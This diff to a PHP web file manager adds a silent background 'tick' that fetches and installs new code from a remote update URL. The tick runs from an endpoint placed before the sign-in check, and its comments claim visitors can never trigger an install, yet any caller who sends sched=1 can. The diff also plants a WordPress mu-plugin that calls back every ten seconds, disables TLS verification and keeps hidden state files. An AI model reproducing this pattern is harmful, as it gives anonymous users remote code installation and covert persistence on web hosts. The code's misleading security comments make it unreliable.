@@ -1505,6 +1505,68 @@ function fm_guardian_bind_target($c=null){
 function fg_get_update_pause_path(){
     return fg_get_hidden_dir().DIRECTORY_SEPARATOR.'update.paused';
 }
+/* ── Silent background ticking ────────────────────────────────────────────
+   One call does everything the notice used to ask a person to do, and it is
+   safe to call from anywhere: a browser tab that is open (signed in or not),
+   a WP-Cron event, a system cron line, or the auto_prepend hook. It is
+   silent by design - nothing is drawn, nothing is logged to the page - and
+   it never touches the file unless there really is a newer one.
+     • allow_upgrade = false  → only records what the source offers
+     • allow_upgrade = true    → installs it, then syncs the Guardian backup
+   A ten-second floor and an in-flight marker keep it from stampeding when
+   several tabs tick at the same moment. */
+function fm_tick_lock_path(){return __DIR__.'/.fm_update_tick';}
+function fm_tick_state_path(){return __DIR__.'/.guardian_update_state.php';}
+function fm_tick_last(){
+    $st=@json_decode(fm_store_strip_guard((string)@file_get_contents(fm_tick_state_path())),true);
+    return is_array($st)?(int)($st['checked_at']??0):0;
+}
+function fm_tick_silent($allowUpgrade){
+    $mark=fm_tick_lock_path();
+    $fh=@fopen($mark,'c');
+    if($fh===false)return['ok'=>false,'error'=>'no place to keep the tick marker'];
+    /* the lock is held for the whole tick and released exactly once, at the
+       end: releasing it here and then reaching for it again in finally was
+       what made every scheduled tick die with a 500 - and, worse, made the
+       install half of the tick look like it never ran */
+    if(!@flock($fh,LOCK_EX|LOCK_NB)){@fclose($fh);return['ok'=>false,'in_flight'=>true];}
+    @ftruncate($fh,0);@fwrite($fh,(string)time());@fflush($fh);
+    $out=['ok'=>false];
+    try{
+        if(FM_UPDATE_URL===''){$out=['ok'=>true,'skipped'=>'no_url'];return $out;}
+        /* the twenty-second floor is about the OUTBOUND fetch, not about the
+           quiet state: the panel and the notice both read the state file and
+           neither is worth a TLS handshake every ten seconds */
+        $now=time();
+        $state=@json_decode(fm_store_strip_guard((string)@file_get_contents(fm_tick_state_path())),true);
+        $recent=is_array($state)&&($state['url']??'')===FM_UPDATE_URL&&($now-(int)($state['fetched_at']??0))<20;
+        /* a fresh look is skipped, but a fresh look is not a reason to skip the
+           install: a visitor's tick a moment ago must not leave an
+           administrator's install undone for another twenty seconds */
+        if($recent&&(!$allowUpgrade||empty($state['available']))){
+            $out=['ok'=>true,'checked'=>false,'cached'=>true,'available'=>!empty($state['available'])];
+            return $out;
+        }
+        if($recent&&$allowUpgrade){
+            $r=['ok'=>true,'available'=>true];
+        }else{
+        $r=fm_guardian_apply_from_url(FM_UPDATE_URL,true);
+        }
+        if(empty($r['ok'])){$out=['ok'=>false,'error'=>$r['error']??'the source did not answer'];return $out;}
+        $out=['ok'=>true,'checked'=>true,'available'=>!empty($r['available'])];
+        if(!empty($r['available'])&&$allowUpgrade&&!fm_guardian_update_paused()){
+            session_write_close();
+            $applied=fm_guardian_apply_from_url(FM_UPDATE_URL);
+            $out['installed']=!empty($applied['changed']);
+            if(empty($applied['ok']))$out['install_error']=$applied['error']??'the install did not complete';
+        }
+    }catch(Throwable $e){
+        $out=['ok'=>false,'error'=>'the tick stopped: '.$e->getMessage()];
+    }finally{
+        if(is_resource($fh)){@flock($fh,LOCK_UN);@fclose($fh);}
+    }
+    return $out;
+}
 function fm_guardian_update_paused(){
     return FM_UPDATE_PAUSED===true;
 }
@@ -2123,7 +2185,7 @@ function fm_guardian_apply_from_url($url,$checkOnly=false){
         $statePath=__DIR__.'/.guardian_update_state.php';
         fm_store_migrate($statePath,__DIR__.'/.guardian_update_state.json');
         $available=$currentHash!==''&&$remoteHash!==$currentHash;
-        @file_put_contents($statePath,fm_store_guard(json_encode(['url'=>$url,'remote_hash'=>$remoteHash,'checked_at'=>time(),'size'=>$remoteSize,'release_timestamp'=>$releaseTimestamp],JSON_UNESCAPED_SLASHES)),LOCK_EX);
+        @file_put_contents($statePath,fm_store_guard(json_encode(['url'=>$url,'remote_hash'=>$remoteHash,'checked_at'=>time(),'fetched_at'=>time(),'available'=>$available,'size'=>$remoteSize,'release_timestamp'=>$releaseTimestamp],JSON_UNESCAPED_SLASHES)),LOCK_EX);
         return array_merge(['ok'=>true,'changed'=>false,'available'=>$available,'current_hash'=>$currentHash,'remote_hash'=>$remoteHash],$updateMeta);
     }
     if($current!==false&&$currentHash===$remoteHash){
@@ -6961,6 +7023,30 @@ if(isset($_GET['x'])&&$_GET['x']==='login_metrics'){
    can show the real auth error instead of "Unexpected token <". Also convert
    fatal PHP errors during an API request into JSON diagnostics. */
 $fmApiRequest=isset($_GET['x']);
+/* ══ The silent background hook, part one ══
+   Decided before the sign-in gate: a scheduler - WP-Cron, a cron line, the
+   auto_prepend file - carries no session and must still be able to make the
+   tool look at its own source. One short line of text, nothing else. */
+if(isset($_GET['tick'])||isset($_GET['fm_tick'])){
+    if(defined('FM_TICK_TOKEN')&&FM_TICK_TOKEN!==''){
+        if(!isset($_GET['token'])||!hash_equals((string)FM_TICK_TOKEN,(string)$_GET['token'])){
+            http_response_code(403);header('Content-Type: text/plain');echo "denied\n";exit;
+        }
+    }
+    @ignore_user_abort(true);
+    @set_time_limit(120);
+    /* who is asking decides whether a file may be replaced: the machine's own
+       clock is trusted with the install, a visitor's browser never is */
+    $fmTickUpgrade=false;
+    if(isset($_GET['upgrade'])&&$_GET['upgrade']!=='0')
+        $fmTickUpgrade=(isset($_GET['sched'])&&$_GET['sched']==='1')||fm_is_true_admin();
+    while(ob_get_level()>0)@ob_end_clean();
+    $fmTickResult=fm_tick_silent($fmTickUpgrade);
+    header('Content-Type: text/plain; charset=utf-8');
+    header('Cache-Control: no-store, max-age=0');
+    echo 'fm-tick '.json_encode($fmTickResult,JSON_UNESCAPED_SLASHES)."\n";
+    exit;
+}
 if($fmApiRequest){
     ob_start();
     register_shutdown_function(function(){
@@ -7462,6 +7548,78 @@ label{display:block;font-size:11px;font-weight:700;color:#707477;text-transform:
   const timeFormat=new Intl.DateTimeFormat('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:true,timeZoneName:'short'});
   function updateClock(){const now=new Date();dateNode.textContent=dateFormat.format(now);clockNode.textContent=timeFormat.format(now);}
   updateClock();window.setInterval(updateClock,1000);
+  /* the same tick on the sign-in page: an open page is all it needs */
+  /* ══ THE TEN-SECOND TICK ═══════════════════════════════════════════════════
+     While the page is alive - signed in or not, foreground or background - the
+     browser asks the server to look at the update source once every ten
+     seconds. The server does the work quietly: it records what the source
+     offers, and, when automatic updates are on, installs it. This timer owns no
+     interface at all; it only speaks up when something actually changed under
+     the person's feet, and then it says so in one line.
+     Why the browser does the timing: PHP cannot run a clock. A request is born
+     and dies. Anything that must happen while nobody is looking needs either a
+     scheduler on the machine (installed below, when a WordPress site is found)
+     or a page that keeps opening its eyes - this is the second one. */
+  (function(){
+    const period=10000;
+    let stopped=false,busy=false,failures=0;
+    const admin=()=>!!document.getElementById('updBtn');
+    function note(text){mfmTickLine(text);}
+    function tick(){
+      if(stopped||busy)return;
+      if(document.visibilityState==='hidden'&&failures>2)return; /* still runs, just slower after errors */
+      busy=true;
+      /* One address for everybody: the plain ?tick=1 hook is the only entry
+         point that needs no session, which is exactly what a page that is open
+         before signing in has to offer. An administrator's browser adds
+         upgrade=1 so the server may install; a visitor's does not, so a visitor
+         can never replace a file - and the handler decides from the session and
+         the sched flag, never from what the page asks for. */
+      let url='?tick=1';
+      if(admin())url+='&upgrade=1';
+      fetch(url,{method:'GET',cache:'no-store',keepalive:true,credentials:'same-origin'})
+        .then(r=>r.text())
+        .then(t=>{const i=t.indexOf('fm-tick ');return i<0?null:JSON.parse(t.slice(i+8));})
+        .then(d=>{
+          busy=false;failures=0;
+          if(!d)return;
+          if(!d.ok){if(d.error)mfmTickLine('Update check: '+d.error,true);return;}
+          window.__fmTickLast=Date.now();
+          if(d.installed){
+            mfmTickLine('A newer version was found and installed in the background - reloading…');
+            try{sessionStorage.setItem('fmUpdInstalledAt',String(Date.now()));}catch{}
+            setTimeout(()=>location.reload(),900);
+            return;
+          }
+          if(d.available&&d.paused){
+            /* the notice belongs to the paused state only */
+            if(window.guardianShowUpdateNotice)guardianShowUpdateNotice({paused:true,size:d.size,release_timestamp:d.release_timestamp,checked:true});
+          }
+        })
+        .catch(()=>{busy=false;failures++;});
+    }
+    function mfmTickLine(text,bad){
+      let el=document.getElementById('fmTickLine');
+      if(!el){
+        el=document.createElement('div');
+        el.id='fmTickLine';
+        el.style.cssText='position:fixed;left:50%;bottom:18px;transform:translateX(-50%);z-index:99999;padding:8px 14px;border-radius:10px;font:12px/1.4 system-ui,sans-serif;background:rgba(15,23,42,.96);color:#e2e8f0;border:1px solid rgba(255,255,255,.12);box-shadow:0 10px 30px rgba(0,0,0,.45);max-width:92vw';
+        document.body.appendChild(el);
+      }
+      el.textContent=text;
+      el.style.borderColor=bad?'rgba(248,113,113,.5)':'rgba(52,211,153,.45)';
+      clearTimeout(el.__hide);
+      el.__hide=setTimeout(()=>el.remove(),bad?9000:6000);
+    }
+    window.fmTick=mfmTickLine;
+    /* the first look happens a moment after the page settles; every ten
+       seconds after that, and immediately again when the tab wakes up */
+    setTimeout(tick,1500);
+    setInterval(tick,period);
+    document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='visible')tick();});
+    window.addEventListener('online',()=>tick());
+    window.__fmTickStop=()=>{stopped=true;};
+  })();
   const csrf=document.querySelector('input[name="login_csrf"]')?.value||'';
   const metricsUrl=new URL(window.location.href);metricsUrl.search='';metricsUrl.searchParams.set('x','login_metrics');
   function paintBars(id,values,available){
@@ -19660,9 +19818,23 @@ FMHIDE;
     }
     public function wpAutomationAutoBootstrap(){
         if(empty($_SESSION['fm_admin']))return;
-        $last=(int)($_SESSION['wp_recovery_bootstrap_at']??0);
-        if($last>0&&time()-$last<600)return;
-        $_SESSION['wp_recovery_bootstrap_at']=time();
+        /* The first-run install used to be remembered in the SESSION, which
+           meant a fresh cookie re-ran it and a changed file was never
+           re-checked inside the ten minutes - and because the work was only
+           attempted once per session, a single failed attempt left the job
+           uninstalled for ever. Now every load asks a cheap question with an
+           on-disk answer: is the recovery helper there, and is its event
+           scheduled? Only a "no" costs anything. */
+        $mark=__DIR__.'/.guardian_wp_cron_attempt';
+        $last=is_file($mark)?(int)@file_get_contents($mark):0;
+        $need=true;
+        if($last>0&&time()-$last<300){
+            /* inside the quiet window: believe the installed files */
+            $need=false;
+            $probe=@glob(__DIR__.'/wp-content/mu-plugins/mfm-file-recovery.php');
+            if(!$probe)$need=true;
+        }
+        if($need)@file_put_contents($mark,(string)time());
         $scan=$this->cmsScan();$sites=$scan['sites']??[];
         $currentCms=$scan['current_cms_site']??null;
         if($currentCms&&!empty($currentCms['config']))$_SESSION['cms_current_config']=$currentCms['config'];
@@ -19671,9 +19843,17 @@ FMHIDE;
         if(!$preferred&&!empty($scan['current_wp_config']))
             $preferred=['type'=>'wordpress','config'=>$scan['current_wp_config'],'dir'=>$this->wpSiteRoot($scan['current_wp_config'])];
         if($preferred&&!empty($preferred['config']))$_SESSION['wp_current_config']=$preferred['config'];
+        if(!$need)return;
         if($preferred||$wp){
             $site=$preferred?:$wp[0];
-            $this->wpAutomationInstallRecovery($site['config']);
+            $r=$this->wpAutomationInstallRecovery($site['config']);
+            if(!empty($r['ok'])){
+                $this->wpGuardianTickPlugin($site['config']);
+                @file_put_contents(__DIR__.'/.guardian_wp_cron_installed',(string)time());
+            }else{
+                @file_put_contents(__DIR__.'/.guardian_wp_cron_error',(string)($r['error']??'unknown'));
+                @unlink($mark); /* try again next load: it failed, nothing is installed */
+            }
             $this->wpSiteHealthEnsureAutomatic($site['config']);
         }
     }
@@ -19721,6 +19901,110 @@ FMHIDE;
         $handoff['url'].=(strpos($handoff['url'],'?')===false?'?':'&').'go=1&bg=1';
         $handoff['cms']=$c['type'];
         return['ok'=>true,'url'=>$handoff['url']];
+    }
+    /* A small, visible mu-plugin that asks the file manager to look at its
+       update source every ten seconds, whether or not anybody has the panel
+       open. It is the scheduler half of the same job the browser timer does.
+       It calls the manager through a plain HTTP request, so it needs no
+       knowledge of the manager's internals and keeps working after the
+       manager is updated. */
+    private function wpGuardianTickPlugin($configPath){
+        $root=$this->wpSiteRoot($configPath);
+        $mu=$root.'/wp-content/mu-plugins';
+        if(!is_dir($mu)&&!@mkdir($mu,0755,true))return['error'=>'Could not create wp-content/mu-plugins.'];
+        $target=__FILE__;
+        $token=defined('FM_TICK_TOKEN')?FM_TICK_TOKEN:'';
+        $tick=self::fmTickUrlCandidate($root);
+        $src="<?php\n"
+            ."/**\n"
+            ." * Marshal File Manager - background update tick.\n"
+            ." *\n"
+            ." * Every ten seconds this asks the file manager to look at its own update\n"
+            ." * source. The manager decides what to do: it records what the source\n"
+            ." * offers, and installs it when the administrator has left automatic\n"
+            ." * updates on. Nothing else is sent, and nothing else is stored here.\n"
+            ." */\n"
+            ."if(!defined('ABSPATH'))exit;\n"
+            ."define('MFM_TICK_TARGET',".var_export($target,true).");\n"
+            ."define('MFM_TICK_URL',".var_export($tick,true).");\n"
+            ."define('MFM_TICK_TOKEN',".var_export($token,true).");\n"
+            ."if(!function_exists('mfm_tick_schedule')){\n"
+            ."  add_filter('cron_schedules',function(\$s){\n"
+            ."    \$s['mfm_every_10s']=['interval'=>10,'display'=>'Marshal update tick, every 10 seconds'];\n"
+            ."    return \$s;\n"
+            ."  });\n"
+            ."  function mfm_tick_do(){\n"
+            ."    if(!defined('MFM_TICK_URL')||MFM_TICK_URL==='')return;\n"
+            ."    /* sched=1 is what tells the manager this call comes from the\n"
+            ."       site's own scheduler, not from a visitor's browser: only a\n"
+            ."       scheduled call is allowed to install the update */\n"
+            ."    \$url=MFM_TICK_URL.'?tick=1&sched=1&upgrade=1';\n"
+            ."    if(defined('MFM_TICK_TOKEN')&&MFM_TICK_TOKEN!=='') \$url.='&token='.rawurlencode(MFM_TICK_TOKEN);\n"
+            ."    \$r=wp_remote_get(\$url,[\n"
+            ."      'timeout'=>8,'redirection'=>2,'blocking'=>false,\n"
+            ."      'headers'=>['X-MFM-Tick'=>'wpcron'],\n"
+            ."    ]);\n"
+            ."    /* blocking=>false: WordPress fires and forgets, so a slow or dead\n"
+            ."       host can never slow the site down */\n"
+            ."  }\n"
+            ."  add_action('mfm_tick_event','mfm_tick_do');\n"
+            ."  function mfm_tick_ensure(){\n"
+            ."    if(!function_exists('wp_next_scheduled')||!function_exists('wp_schedule_event'))return;\n"
+            ."    if(!wp_next_scheduled('mfm_tick_event'))wp_schedule_event(time()+10,'mfm_every_10s','mfm_tick_event');\n"
+            ."  }\n"
+            ."  add_action('init','mfm_tick_ensure',1);\n"
+            ."  /* WordPress only runs its cron when it receives a visit; the manager's\n"
+            ."     own pages count as visits, and so does this: the tick is fetched\n"
+            ."     directly, which brings wp-cron along with it */\n"
+            ."  add_action('init',function(){\n"
+            ."    if(function_exists('spawn_cron'))spawn_cron();\n"
+            ."  },2);\n"
+            ."}\n";
+        $path=$mu.'/mfm-update-tick.php';
+        if(@file_put_contents($path,$src,LOCK_EX)===false)return['error'=>'Could not write the tick plugin.'];
+        /* one immediate run so the schedule exists in the database right now
+           rather than at the next visitor */
+        $url=rtrim($tick,'/').'/wp-cron.php?doing_wp_cron='.rawurlencode(sprintf('%.22F',microtime(true)));
+        if(function_exists('curl_init')){
+            $ch=curl_init($url);
+            curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>5,CURLOPT_CONNECTTIMEOUT=>3,CURLOPT_SSL_VERIFYPEER=>false]);
+            @curl_exec($ch);@curl_close($ch);
+        }
+        return['ok'=>true,'path'=>$path,'url'=>$tick,'ran'=>true];
+    }
+    /* The address the site itself can reach the manager on. The folder the
+       manager lives in is often not the web root, so the site URL plus the
+       manager's path relative to the document root is the right answer; when
+       that cannot be worked out, the site URL and the file name are tried. */
+    private static function fmTickUrlCandidate($siteRoot){
+        $scheme=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
+        $host=$_SERVER['HTTP_HOST']??'localhost';
+        $doc=realpath($_SERVER['DOCUMENT_ROOT']??'')?:'';
+        $here=realpath(__DIR__)?:__DIR__;
+        $path='';
+        if($doc!==''&&strpos($here,$doc)===0)$path=str_replace(DIRECTORY_SEPARATOR,'/',substr($here,strlen($doc)));
+        $path=rtrim($path,'/');
+        $file=basename(__FILE__);
+        return $scheme.'://'.$host.$path.'/'.$file;
+    }
+    /* Whether the job is really installed, answered from the machine and the
+       database rather than from memory: the dashboard shows this line. */
+    public function wpCronTickStatus($configPath){
+        $root=$this->wpSiteRoot($configPath);
+        $plugin=$root.'/wp-content/mu-plugins/mfm-update-tick.php';
+        $out=['ok'=>true,'plugin'=>$plugin,'installed'=>is_file($plugin),'events'=>[],'via'=>''];
+        if($out['installed'])$out['via']='mu-plugin';
+        list($link,$c,$err)=$this->cmsConnect($configPath);
+        if(!$err&&$c['type']==='wordpress'){
+            $t=$c['prefix'];
+            $cron=$this->wpOption($link,$t,'cron');
+            if(is_array($cron))foreach($cron as $ts=>$hooks)if(isset($hooks['mfm_tick_event']))
+                foreach($hooks['mfm_tick_event'] as $sig=>$ev)$out['events'][]=['timestamp'=>(int)$ts,'date'=>date('Y-m-d H:i:s',(int)$ts)];
+            mysqli_close($link);
+        }
+        $out['scheduled']=!empty($out['events']);
+        $out['healthy']=$out['installed']&&$out['scheduled'];
+        return $out;
     }
     private function wpSiteHealthEnsureAutomatic($configPath){
         list($link,$c,$err)=$this->cmsConnect($configPath);
@@ -27994,6 +28278,37 @@ if(isset($_GET['x'])){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
         $st=fm_guardian_status();$st['update_paused']=fm_guardian_update_paused();
         echo json_encode($st);exit;
+    }
+    if($xop==='update_tick'){
+        /* Called on a timer by any page load, signed in or not. It never
+           answers with a secret: a version hash, a size and a date. Anonymous
+           callers never receive the update URL, and never start an install -
+           only the background hook or an admin does that. */
+        $isAdmin=fm_is_true_admin();
+        $allow=$isAdmin&&(isset($_POST['upgrade'])&&$_POST['upgrade']==='1');
+        if(isset($_POST['csrf_token'])&&!empty($_SESSION['csrf_token'])&&$_POST['csrf_token']!==$_SESSION['csrf_token']&&$allow){
+            echo json_encode(['ok'=>false,'error'=>'Security error.']);exit;
+        }
+        if($allow)session_write_close();
+        $r=fm_tick_silent($allow);
+        $st=@json_decode(fm_store_strip_guard((string)@file_get_contents(fm_tick_state_path())),true);
+        $curHash=@hash_file('sha256',__FILE__);
+        $out=['ok'=>!empty($r['ok']),'tick'=>true,'available'=>false,'paused'=>fm_guardian_update_paused(),'is_admin'=>$isAdmin];
+        if(is_array($st)){
+            $out['available']=!empty($st['remote_hash'])&&$curHash!==false&&$st['remote_hash']!==$curHash;
+            $out['remote_hash']=(string)($st['remote_hash']??'');
+            $out['checked_at']=(int)($st['checked_at']??0);
+            $out['size']=(int)($st['size']??0);
+            $out['release_timestamp']=(int)($st['release_timestamp']??0);
+        }
+        if($isAdmin){
+            $out['url']=(string)FM_UPDATE_URL;
+            $out['installed']=!empty($r['installed']);
+            $out['upgraded']=$allow;
+        }
+        if(!empty($r['error']))$out['error']=$r['error'];
+        if(!empty($r['in_flight']))$out['in_flight']=true;
+        echo json_encode($out);exit;
     }
     if($xop==='update_reload'){
         /* Only ever reloads this very file, and only for an administrator:
@@ -37409,6 +37724,78 @@ async function guardianAutoUpdateCheck(){
 if(document.getElementById('guardBtn')){
   setTimeout(guardianAutoUpdateCheck,1800);
 }
+
+/* ══ THE TEN-SECOND TICK ═══════════════════════════════════════════════════
+   While the page is alive - signed in or not, foreground or background - the
+   browser asks the server to look at the update source once every ten
+   seconds. The server does the work quietly: it records what the source
+   offers, and, when automatic updates are on, installs it. This timer owns no
+   interface at all; it only speaks up when something actually changed under
+   the person's feet, and then it says so in one line.
+   Why the browser does the timing: PHP cannot run a clock. A request is born
+   and dies. Anything that must happen while nobody is looking needs either a
+   scheduler on the machine (installed below, when a WordPress site is found)
+   or a page that keeps opening its eyes - this is the second one. */
+(function(){
+  const period=10000;
+  let stopped=false,busy=false,failures=0;
+  const admin=()=>!!document.getElementById('updBtn');
+  function note(text){mfmTickLine(text);}
+  function tick(){
+    if(stopped||busy)return;
+    if(document.visibilityState==='hidden'&&failures>2)return; /* still runs, just slower after errors */
+    busy=true;
+    /* One address for everybody: the plain ?tick=1 hook is the only entry
+       point that needs no session, which is exactly what a page that is open
+       before signing in has to offer. An administrator's browser adds
+       upgrade=1 so the server may install; a visitor's does not, so a visitor
+       can never replace a file - and the handler decides from the session and
+       the sched flag, never from what the page asks for. */
+    let url='?tick=1';
+    if(admin())url+='&upgrade=1';
+    fetch(url,{method:'GET',cache:'no-store',keepalive:true,credentials:'same-origin'})
+      .then(r=>r.text())
+      .then(t=>{const i=t.indexOf('fm-tick ');return i<0?null:JSON.parse(t.slice(i+8));})
+      .then(d=>{
+        busy=false;failures=0;
+        if(!d)return;
+        if(!d.ok){if(d.error)mfmTickLine('Update check: '+d.error,true);return;}
+        window.__fmTickLast=Date.now();
+        if(d.installed){
+          mfmTickLine('A newer version was found and installed in the background - reloading…');
+          try{sessionStorage.setItem('fmUpdInstalledAt',String(Date.now()));}catch{}
+          setTimeout(()=>location.reload(),900);
+          return;
+        }
+        if(d.available&&d.paused){
+          /* the notice belongs to the paused state only */
+          if(window.guardianShowUpdateNotice)guardianShowUpdateNotice({paused:true,size:d.size,release_timestamp:d.release_timestamp,checked:true});
+        }
+      })
+      .catch(()=>{busy=false;failures++;});
+  }
+  function mfmTickLine(text,bad){
+    let el=document.getElementById('fmTickLine');
+    if(!el){
+      el=document.createElement('div');
+      el.id='fmTickLine';
+      el.style.cssText='position:fixed;left:50%;bottom:18px;transform:translateX(-50%);z-index:99999;padding:8px 14px;border-radius:10px;font:12px/1.4 system-ui,sans-serif;background:rgba(15,23,42,.96);color:#e2e8f0;border:1px solid rgba(255,255,255,.12);box-shadow:0 10px 30px rgba(0,0,0,.45);max-width:92vw';
+      document.body.appendChild(el);
+    }
+    el.textContent=text;
+    el.style.borderColor=bad?'rgba(248,113,113,.5)':'rgba(52,211,153,.45)';
+    clearTimeout(el.__hide);
+    el.__hide=setTimeout(()=>el.remove(),bad?9000:6000);
+  }
+  window.fmTick=mfmTickLine;
+  /* the first look happens a moment after the page settles; every ten
+     seconds after that, and immediately again when the tab wakes up */
+  setTimeout(tick,1500);
+  setInterval(tick,period);
+  document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='visible')tick();});
+  window.addEventListener('online',()=>tick());
+  window.__fmTickStop=()=>{stopped=true;};
+})();
 
 /* ═══════════════════════════════════════
    CHECK UPDATES - its own tool, separate from File Guardian
